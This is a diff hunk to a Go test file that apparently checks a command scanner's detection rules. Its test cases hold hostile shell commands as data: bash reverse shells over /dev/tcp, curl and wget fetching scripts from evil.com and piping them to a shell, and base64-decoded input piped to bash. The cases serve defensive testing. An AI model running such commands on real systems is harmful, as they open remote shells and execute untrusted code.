@@ -194,7 +194,7 @@ func TestCommandRules_TruePositives(t *testing.T) {
 		{"bash reverse shell", `bash -i >& /dev/tcp/10.0.0.1/4444`, "CMD-REVSHELL-BASH"},
 		{"/dev/tcp reverse shell", `/dev/tcp/192.168.1.1/8080`, "CMD-REVSHELL-DEVTCP"},
 		{"curl piped to bash", `curl https://evil.com/payload.sh | bash`, "CMD-PIPE-CURL"},
-		{"wget piped to sh", `wget https://evil.com/script | sh`, "CMD-PIPE-WGET"},
+		{"wget stdout piped to sh", `wget -qO- https://evil.com/script | sh`, "CMD-PIPE-WGET"},
 		{"base64 decode piped to bash", `base64 -d | bash`, "CMD-PIPE-BASE64"},
 		{"eval with variable", `eval "$PAYLOAD"`, "CMD-EVAL"},
 		{"bash -c execution", `bash -c "whoami"`, "CMD-BASH-C"},
